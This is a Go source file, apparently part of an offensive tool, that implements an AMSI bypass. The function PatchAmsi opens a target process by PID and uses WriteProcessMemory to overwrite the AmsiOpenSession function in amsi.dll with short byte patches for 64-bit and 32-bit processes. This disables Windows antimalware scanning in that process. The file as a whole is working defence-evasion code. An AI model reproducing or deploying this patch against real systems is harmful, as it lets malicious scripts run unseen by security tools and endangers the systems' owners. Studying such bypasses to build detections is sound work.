package modules

import (
	"errors"
	"fmt"

	"golang.org/x/sys/windows"
)

const (
	PROCESS_VM_OPERATION uint32 = 0x0008
	PROCESS_VM_WRITE     uint32 = 0x0020
)

// Amsi bypass by injecting into the provided PID
// and overwriting the AMSI.AmsiOpenSession function
func PatchAmsi(pid int) error {
	// Open handle to the process based on the PID
	// HANDLE OpenProcess(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);
	// dwDesiredAccess = PROCESS_VM_OPERATION (0x0008) | PROCESS_VM_WRITE (0x0020)
	// bInheritHandle = False
	// dwProcessId = PID
	procHandle, err := windows.OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE, false, uint32(pid))

	if err != nil {
		rs := fmt.Sprintf("Error opening process with PID: %d\n", pid)
		return errors.New(rs)
	}

	/// Load amsi.dll into the process
	amsi := windows.NewLazySystemDLL("amsi.dll")
	amsiOpenSession := amsi.NewProc("AmsiOpenSession")

	// Payload to inject into the function
	// xor rax, rax
	// bytes for 64bit process
	newBytes := []byte{0x48, 0x31, 0xC0}

	// xor eax, eax
	// 33 C0
	// kept the first few instructions before the je instruction
	// bytes for 32bit process
	if IsWOW64Process() {
		newBytes = []byte{0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x8B, 0x4D, 0x0C, 0x33, 0xC0}
	}

	lbytes := uintptr(len(newBytes))

	// Write the payload
	// BOOL WriteProcessMemory(HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesWritten);
	var bytesWritten uintptr
	err = windows.WriteProcessMemory(procHandle, amsiOpenSession.Addr(), &newBytes[0], lbytes, &bytesWritten)
	if err != nil {
		rs := fmt.Sprintf("Failed to patch AMSI.AmsiOpenSession in process with PID: %d\n", pid)
		return errors.New(rs)
	}

	// Close the handle
	windows.Close(procHandle)

	return nil
}
